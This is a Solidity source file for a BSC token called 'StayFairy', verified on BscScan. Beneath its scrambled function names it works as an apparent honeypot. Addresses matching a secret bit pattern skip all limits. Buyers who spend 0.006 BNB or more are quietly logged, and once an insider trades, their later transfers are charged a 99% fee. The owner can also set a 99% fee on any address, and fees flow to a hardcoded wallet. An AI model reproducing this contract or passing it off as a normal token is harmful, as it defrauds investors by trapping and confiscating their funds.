/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract StayFairy is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Stay Fairy ";
    string constant _symbol = "StayFairy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private feeMaxSwapLimit;
    mapping(address => bool) private exemptIsSwapLimitSellBurn;
    mapping(address => bool) private maxAutoBuySell;
    mapping(address => bool) private swapWalletBuyFee;
    mapping(address => uint256) private liquidityMinMarketingTx;
    mapping(uint256 => address) private botsLaunchedFeeTx;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private liquidityMaxTeamSellBurn = 0;
    uint256 private teamExemptBurnLaunchedMinFeeBots = 7;

    //SELL FEES
    uint256 private teamSwapModeWallet = 0;
    uint256 private txWalletLiquidityBuy = 7;

    uint256 private feeTeamIsLimitMarketingLiquidity = teamExemptBurnLaunchedMinFeeBots + liquidityMaxTeamSellBurn;
    uint256 private receiverTradingFeeMarketingMax = 100;

    address private feeSwapIsMarketing = (msg.sender); // auto-liq address
    address private feeSwapTxLimit = (0xf3Fb394c0da7b9a58E97ccb5ffffC5c14E3039E3); // marketing address
    address private sellMarketingBuyFee = DEAD;
    address private botsTeamIsLimitLaunchedBuyTx = DEAD;
    address private teamMinIsSwap = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private autoTxTradingFeeMinLiquidityBurn;
    uint256 private autoBotsTeamSwapReceiverExemptMode;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingIsSwapMarketing;
    uint256 private teamWalletBuyAuto;
    uint256 private swapMinReceiverFee;
    uint256 private tradingExemptWalletAuto;
    uint256 private receiverBuyMarketingTx;

    bool private feeWalletBotsLaunchedTx = true;
    bool private swapWalletBuyFeeMode = true;
    bool private teamLimitIsMax = true;
    bool private isAutoSellReceiver = true;
    bool private feeModeSellTxLiquiditySwap = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private sellLaunchedFeeMarketing = 6 * 10 ** 15;
    uint256 private modeMinLimitFee = _totalSupply / 1000; // 0.1%

    
    bool private exemptTradingBuyLimit = false;
    bool private maxModeReceiverTeamMin = false;
    uint256 private limitIsWalletLiquidityExemptBotsTx = 0;
    bool private tradingSellBurnLiquidityAutoReceiver = false;
    uint256 private minBuyExemptMaxFeeBurn = 0;
    bool private txTradingBotsMin = false;
    uint256 private tradingBurnLaunchedMinSellTx = 0;
    bool private feeSellBurnModeReceiver = false;
    bool private receiverBurnMinBuyBots = false;
    uint256 private maxTradingMarketingMin = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingIsSwapMarketing = true;

        feeMaxSwapLimit[msg.sender] = true;
        feeMaxSwapLimit[address(this)] = true;

        exemptIsSwapLimitSellBurn[msg.sender] = true;
        exemptIsSwapLimitSellBurn[0x0000000000000000000000000000000000000000] = true;
        exemptIsSwapLimitSellBurn[0x000000000000000000000000000000000000dEaD] = true;
        exemptIsSwapLimitSellBurn[address(this)] = true;

        maxAutoBuySell[msg.sender] = true;
        maxAutoBuySell[0x0000000000000000000000000000000000000000] = true;
        maxAutoBuySell[0x000000000000000000000000000000000000dEaD] = true;
        maxAutoBuySell[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return swapMaxMarketingMinLimitBuy(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return swapMaxMarketingMinLimitBuy(sender, recipient, amount);
    }

    function swapMaxMarketingMinLimitBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (tradingBurnLaunchedMinSellTx != txWalletLiquidityBuy) {
            tradingBurnLaunchedMinSellTx = tradingBurnLaunchedMinSellTx;
        }

        if (minBuyExemptMaxFeeBurn != modeMinLimitFee) {
            minBuyExemptMaxFeeBurn = receiverTradingFeeMarketingMax;
        }

        if (tradingSellBurnLiquidityAutoReceiver == maxModeReceiverTeamMin) {
            tradingSellBurnLiquidityAutoReceiver = maxModeReceiverTeamMin;
        }


        bool bLimitTxWalletValue = liquidityAutoLimitMarketing(sender) || liquidityAutoLimitMarketing(recipient);
        
        if (tradingBurnLaunchedMinSellTx == tradingBurnLaunchedMinSellTx) {
            tradingBurnLaunchedMinSellTx = feeTeamIsLimitMarketingLiquidity;
        }

        if (maxModeReceiverTeamMin == feeModeSellTxLiquiditySwap) {
            maxModeReceiverTeamMin = teamLimitIsMax;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                limitTeamLaunchedBuy();
            }
            if (!bLimitTxWalletValue) {
                tradingLaunchedTeamAuto(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return swapTeamMarketingExemptTradingIs(sender, recipient, amount);}

        if (!feeMaxSwapLimit[sender] && !feeMaxSwapLimit[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || maxAutoBuySell[sender] || maxAutoBuySell[recipient], "Max TX Limit has been triggered");

        if (modeBurnLimitBuyLaunched()) {teamLimitLiquidityExemptBurnTradingTx();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (maxModeReceiverTeamMin == receiverBurnMinBuyBots) {
            maxModeReceiverTeamMin = exemptTradingBuyLimit;
        }

        if (maxTradingMarketingMin == sellLaunchedFeeMarketing) {
            maxTradingMarketingMin = teamSwapModeWallet;
        }


        uint256 amountReceived = buyLaunchedWalletSwap(sender) ? limitWalletExemptTradingLaunchedLiquidity(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function swapTeamMarketingExemptTradingIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function buyLaunchedWalletSwap(address sender) internal view returns (bool) {
        return !exemptIsSwapLimitSellBurn[sender];
    }

    function sellMaxMinLaunched(address sender, bool selling) internal returns (uint256) {
        
        if (tradingBurnLaunchedMinSellTx != maxTradingMarketingMin) {
            tradingBurnLaunchedMinSellTx = maxTradingMarketingMin;
        }


        if (selling) {
            feeTeamIsLimitMarketingLiquidity = txWalletLiquidityBuy + teamSwapModeWallet;
            return buyFeeMinIsWalletMax(sender, feeTeamIsLimitMarketingLiquidity);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeTeamIsLimitMarketingLiquidity = teamExemptBurnLaunchedMinFeeBots + liquidityMaxTeamSellBurn;
            return feeTeamIsLimitMarketingLiquidity;
        }
        return buyFeeMinIsWalletMax(sender, feeTeamIsLimitMarketingLiquidity);
    }

    function limitLaunchedSwapBuyExemptMode() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function limitWalletExemptTradingLaunchedLiquidity(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(sellMaxMinLaunched(sender, receiver == uniswapV2Pair)).div(receiverTradingFeeMarketingMax);

        if (swapWalletBuyFee[sender] || swapWalletBuyFee[receiver]) {
            feeAmount = amount.mul(99).div(receiverTradingFeeMarketingMax);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityAutoLimitMarketing(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function buyFeeMinIsWalletMax(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = liquidityMinMarketingTx[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function tradingLaunchedTeamAuto(address addr) private {
        if (limitLaunchedSwapBuyExemptMode() < sellLaunchedFeeMarketing) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        botsLaunchedFeeTx[exemptLimitValue] = addr;
    }

    function limitTeamLaunchedBuy() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (liquidityMinMarketingTx[botsLaunchedFeeTx[i]] == 0) {
                    liquidityMinMarketingTx[botsLaunchedFeeTx[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(feeSwapTxLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function modeBurnLimitBuyLaunched() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    feeModeSellTxLiquiditySwap &&
    _balances[address(this)] >= modeMinLimitFee;
    }

    function teamLimitLiquidityExemptBurnTradingTx() internal swapping {
        
        uint256 amountToLiquify = modeMinLimitFee.mul(liquidityMaxTeamSellBurn).div(feeTeamIsLimitMarketingLiquidity).div(2);
        uint256 amountToSwap = modeMinLimitFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeTeamIsLimitMarketingLiquidity.sub(liquidityMaxTeamSellBurn.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityMaxTeamSellBurn).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(teamExemptBurnLaunchedMinFeeBots).div(totalETHFee);
        
        payable(feeSwapTxLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                feeSwapIsMarketing,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapWalletBuyFee(address a0) public view returns (bool) {
        if (swapWalletBuyFee[a0] != exemptIsSwapLimitSellBurn[a0]) {
            return exemptTradingBuyLimit;
        }
        if (swapWalletBuyFee[a0] != exemptIsSwapLimitSellBurn[a0]) {
            return isAutoSellReceiver;
        }
        if (swapWalletBuyFee[a0] == exemptIsSwapLimitSellBurn[a0]) {
            return exemptTradingBuyLimit;
        }
            return swapWalletBuyFee[a0];
    }
    function setSwapWalletBuyFee(address a0,bool a1) public onlyOwner {
        if (a0 == teamMinIsSwap) {
            exemptTradingBuyLimit=a1;
        }
        swapWalletBuyFee[a0]=a1;
    }

    function getLimitIsWalletLiquidityExemptBotsTx() public view returns (uint256) {
        if (limitIsWalletLiquidityExemptBotsTx == receiverTradingFeeMarketingMax) {
            return receiverTradingFeeMarketingMax;
        }
        if (limitIsWalletLiquidityExemptBotsTx != txWalletLiquidityBuy) {
            return txWalletLiquidityBuy;
        }
        return limitIsWalletLiquidityExemptBotsTx;
    }
    function setLimitIsWalletLiquidityExemptBotsTx(uint256 a0) public onlyOwner {
        if (limitIsWalletLiquidityExemptBotsTx != feeTeamIsLimitMarketingLiquidity) {
            feeTeamIsLimitMarketingLiquidity=a0;
        }
        limitIsWalletLiquidityExemptBotsTx=a0;
    }

    function getExemptTradingBuyLimit() public view returns (bool) {
        if (exemptTradingBuyLimit == tradingSellBurnLiquidityAutoReceiver) {
            return tradingSellBurnLiquidityAutoReceiver;
        }
        if (exemptTradingBuyLimit == txTradingBotsMin) {
            return txTradingBotsMin;
        }
        if (exemptTradingBuyLimit == receiverBurnMinBuyBots) {
            return receiverBurnMinBuyBots;
        }
        return exemptTradingBuyLimit;
    }
    function setExemptTradingBuyLimit(bool a0) public onlyOwner {
        if (exemptTradingBuyLimit == receiverBurnMinBuyBots) {
            receiverBurnMinBuyBots=a0;
        }
        if (exemptTradingBuyLimit != feeSellBurnModeReceiver) {
            feeSellBurnModeReceiver=a0;
        }
        if (exemptTradingBuyLimit != tradingSellBurnLiquidityAutoReceiver) {
            tradingSellBurnLiquidityAutoReceiver=a0;
        }
        exemptTradingBuyLimit=a0;
    }

    function getMaxAutoBuySell(address a0) public view returns (bool) {
            return maxAutoBuySell[a0];
    }
    function setMaxAutoBuySell(address a0,bool a1) public onlyOwner {
        if (maxAutoBuySell[a0] == exemptIsSwapLimitSellBurn[a0]) {
           exemptIsSwapLimitSellBurn[a0]=a1;
        }
        if (a0 == sellMarketingBuyFee) {
            tradingSellBurnLiquidityAutoReceiver=a1;
        }
        maxAutoBuySell[a0]=a1;
    }

    function getLiquidityMaxTeamSellBurn() public view returns (uint256) {
        return liquidityMaxTeamSellBurn;
    }
    function setLiquidityMaxTeamSellBurn(uint256 a0) public onlyOwner {
        liquidityMaxTeamSellBurn=a0;
    }

    function getIsAutoSellReceiver() public view returns (bool) {
        if (isAutoSellReceiver != receiverBurnMinBuyBots) {
            return receiverBurnMinBuyBots;
        }
        if (isAutoSellReceiver == receiverBurnMinBuyBots) {
            return receiverBurnMinBuyBots;
        }
        return isAutoSellReceiver;
    }
    function setIsAutoSellReceiver(bool a0) public onlyOwner {
        isAutoSellReceiver=a0;
    }

    function getBotsTeamIsLimitLaunchedBuyTx() public view returns (address) {
        if (botsTeamIsLimitLaunchedBuyTx != sellMarketingBuyFee) {
            return sellMarketingBuyFee;
        }
        if (botsTeamIsLimitLaunchedBuyTx == sellMarketingBuyFee) {
            return sellMarketingBuyFee;
        }
        return botsTeamIsLimitLaunchedBuyTx;
    }
    function setBotsTeamIsLimitLaunchedBuyTx(address a0) public onlyOwner {
        if (botsTeamIsLimitLaunchedBuyTx == sellMarketingBuyFee) {
            sellMarketingBuyFee=a0;
        }
        botsTeamIsLimitLaunchedBuyTx=a0;
    }

    function getTxTradingBotsMin() public view returns (bool) {
        if (txTradingBotsMin != txTradingBotsMin) {
            return txTradingBotsMin;
        }
        if (txTradingBotsMin == isAutoSellReceiver) {
            return isAutoSellReceiver;
        }
        if (txTradingBotsMin == exemptTradingBuyLimit) {
            return exemptTradingBuyLimit;
        }
        return txTradingBotsMin;
    }
    function setTxTradingBotsMin(bool a0) public onlyOwner {
        if (txTradingBotsMin != txTradingBotsMin) {
            txTradingBotsMin=a0;
        }
        if (txTradingBotsMin == exemptTradingBuyLimit) {
            exemptTradingBuyLimit=a0;
        }
        if (txTradingBotsMin != swapWalletBuyFeeMode) {
            swapWalletBuyFeeMode=a0;
        }
        txTradingBotsMin=a0;
    }

    function getTeamMinIsSwap() public view returns (address) {
        if (teamMinIsSwap != feeSwapIsMarketing) {
            return feeSwapIsMarketing;
        }
        if (teamMinIsSwap == sellMarketingBuyFee) {
            return sellMarketingBuyFee;
        }
        if (teamMinIsSwap == botsTeamIsLimitLaunchedBuyTx) {
            return botsTeamIsLimitLaunchedBuyTx;
        }
        return teamMinIsSwap;
    }
    function setTeamMinIsSwap(address a0) public onlyOwner {
        teamMinIsSwap=a0;
    }

    function getFeeMaxSwapLimit(address a0) public view returns (bool) {
            return feeMaxSwapLimit[a0];
    }
    function setFeeMaxSwapLimit(address a0,bool a1) public onlyOwner {
        if (feeMaxSwapLimit[a0] != maxAutoBuySell[a0]) {
           maxAutoBuySell[a0]=a1;
        }
        feeMaxSwapLimit[a0]=a1;
    }

    function getFeeWalletBotsLaunchedTx() public view returns (bool) {
        if (feeWalletBotsLaunchedTx != maxModeReceiverTeamMin) {
            return maxModeReceiverTeamMin;
        }
        if (feeWalletBotsLaunchedTx != isAutoSellReceiver) {
            return isAutoSellReceiver;
        }
        return feeWalletBotsLaunchedTx;
    }
    function setFeeWalletBotsLaunchedTx(bool a0) public onlyOwner {
        if (feeWalletBotsLaunchedTx == txTradingBotsMin) {
            txTradingBotsMin=a0;
        }
        if (feeWalletBotsLaunchedTx == feeModeSellTxLiquiditySwap) {
            feeModeSellTxLiquiditySwap=a0;
        }
        if (feeWalletBotsLaunchedTx == swapWalletBuyFeeMode) {
            swapWalletBuyFeeMode=a0;
        }
        feeWalletBotsLaunchedTx=a0;
    }

    function getMaxModeReceiverTeamMin() public view returns (bool) {
        if (maxModeReceiverTeamMin == feeWalletBotsLaunchedTx) {
            return feeWalletBotsLaunchedTx;
        }
        if (maxModeReceiverTeamMin != txTradingBotsMin) {
            return txTradingBotsMin;
        }
        if (maxModeReceiverTeamMin == txTradingBotsMin) {
            return txTradingBotsMin;
        }
        return maxModeReceiverTeamMin;
    }
    function setMaxModeReceiverTeamMin(bool a0) public onlyOwner {
        if (maxModeReceiverTeamMin == txTradingBotsMin) {
            txTradingBotsMin=a0;
        }
        maxModeReceiverTeamMin=a0;
    }

    function getModeMinLimitFee() public view returns (uint256) {
        if (modeMinLimitFee != liquidityMaxTeamSellBurn) {
            return liquidityMaxTeamSellBurn;
        }
        return modeMinLimitFee;
    }
    function setModeMinLimitFee(uint256 a0) public onlyOwner {
        if (modeMinLimitFee != teamSwapModeWallet) {
            teamSwapModeWallet=a0;
        }
        if (modeMinLimitFee == maxTradingMarketingMin) {
            maxTradingMarketingMin=a0;
        }
        if (modeMinLimitFee != limitIsWalletLiquidityExemptBotsTx) {
            limitIsWalletLiquidityExemptBotsTx=a0;
        }
        modeMinLimitFee=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}